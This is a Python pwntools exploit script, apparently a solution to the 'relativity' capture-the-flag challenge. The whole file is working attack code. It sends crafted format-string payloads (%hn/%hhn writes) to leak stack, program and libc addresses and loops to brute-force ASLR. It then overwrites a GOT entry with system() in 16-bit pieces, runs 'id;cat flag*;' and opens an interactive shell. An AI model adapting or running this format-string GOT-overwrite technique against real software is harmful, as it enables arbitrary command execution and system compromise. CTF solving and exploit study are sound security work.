#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF("vuln_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "relativity.chal.idek.team", "1337"

# loop that wait for good aslr, and do ret2main
count = 0
while (count<65536):
  print('count = '+str(count))
  if args.REMOTE:
    p = remote(host,port)
  else:
    p = process([exe.path],env={})
  count +=1
  sla('void? \n', '%c%c%c%c%c%c%c%p.%p.%c%p.%c%*c'+'%c'*12+'%65182c'+'%hn'+'%c'*11+'%15c'+'%hhn'+'PIPO')
  stack = int(rcu('0x',b'.'),16)
  exe.address = int(rcu('0x',b'.'),16) - 0x135c
  libc.address = int(rcu('0x',b'.'),16) - 0x24083
  if (((stack & 0xff000000)>>24) > 16) or ((stack & 0xff) != 0x60):
    p.close()
    continue
  print('stack = '+hex(stack))
  print('prog = '+hex(exe.address))
  print('libc base = '+hex(libc.address))
  p.recvuntil('PIPO', drop=True)
  buff=p.recv(timeout=1)
  if 'void' in buff:
    print(buff)
    break
  else:
    p.close()
    continue

low = (exe.address+0x127f)&0xffff
# set stack pointers to points to good place on stack
p.sendline('%c'*15+'%9c'+'%hhn'+'%c'*26+'%'+str(low-(0x18+26))+'c%hn')

sla('void? \n', '%c'*6+'%138c'+'%hhn'+'%c'*35+'%'+str(low-(0x90+35))+'c%hn')

# 1. set GOT entry of system to system() and restart vuln
print('1')
low2 = (exe.address+0x4018)&0xffff
low3 = (libc.sym['system'])&0xffff
sla('void? \n', '%c'*10+'%'+str(low2-10)+'c'+'%hn'+'%c'*31+'%'+str( ((0x10000-low2)-31) + low )+'c%hn')
sla('void? \n', '%c'*18+'%'+str(low3-18)+'c'+'%hn'+'%c'*23+'%'+str( ((0x10000-low3)-23) + low )+'c%hn')
# 2. set GOT entry of system to system() and restart vuln
print('2')
low2 = (exe.address+0x401a)&0xffff
low3 = (libc.sym['system']>>16)&0xffff
sla('void? \n', '%c'*10+'%'+str(low2-10)+'c'+'%hn'+'%c'*31+'%'+str( ((0x10000-low2)-31) + low )+'c%hn')
sla('void? \n', '%c'*18+'%'+str(low3-18)+'c'+'%hn'+'%c'*23+'%'+str( ((0x10000-low3)-23) + low )+'c%hn')
# 3. set GOT entry of system to system() and restart vuln
print('3')
low2 = (exe.address+0x401c)&0xffff
low3 = (libc.sym['system']>>32)&0xffff
sla('void? \n', '%c'*10+'%'+str(low2-10)+'c'+'%hn'+'%c'*31+'%'+str( ((0x10000-low2)-31) + low )+'c%hn')
sla('void? \n', '%c'*18+'%'+str(low3-18)+'c'+'%hn'+'%c'*23+'%'+str( ((0x10000-low3)-23) + low )+'c%hnPIPO')

p.recvuntil('PIPO', drop=True)
# now we can send commands, they will be executed when vuln() function try to free our buffer (as free has beend replaced by system)
p.sendline('id;cat flag*;')

p.interactive()

